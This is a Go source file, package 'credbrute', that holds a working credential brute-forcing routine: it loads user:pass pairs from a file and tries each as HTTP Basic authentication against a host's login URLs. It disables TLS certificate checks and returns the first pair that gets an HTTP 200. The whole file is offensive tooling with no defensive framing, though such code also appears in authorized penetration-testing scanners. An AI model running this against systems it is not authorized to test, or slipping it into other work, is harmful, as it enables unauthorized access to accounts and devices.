package credbrute

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/base64"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

// Try default Basic creds against discovered login pages. Returns "user:pass" on first success.
func TryDefaultBasic(ctx context.Context, host string, loginURLs []string, credFile string, timeout time.Duration) string {
	f, err := os.Open(credFile)
	if err != nil { return "" }
	defer f.Close()

	client := &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{ InsecureSkipVerify: true },
			DisableKeepAlives: true,
			DialContext: (&net.Dialer{ Timeout: timeout }).DialContext,
		},
	}

	var creds []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line=="" || strings.HasPrefix(line,"#") { continue }
		creds = append(creds, line)
	}

	for _, u := range loginURLs {
		// preflight: ensure auth is actually requested
		req0, _ := http.NewRequestWithContext(ctx, "GET", u, nil)
		resp0, err := client.Do(req0)
		if err != nil { continue }
		auth := resp0.Header.Get("WWW-Authenticate")
		resp0.Body.Close()
		if auth=="" && resp0.StatusCode!=401 && resp0.StatusCode!=403 {
			continue // skip non-protected path
		}

		for _, c := range creds {
			up := strings.SplitN(c, ":", 2)
			if len(up)!=2 { continue }
			req, _ := http.NewRequestWithContext(ctx, "GET", u, nil)
			req.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(c)))
			resp, err := client.Do(req)
			if err != nil { continue }
			resp.Body.Close()
			if resp.StatusCode==200 {
				return c // found
			}
		}
	}
	return ""
}
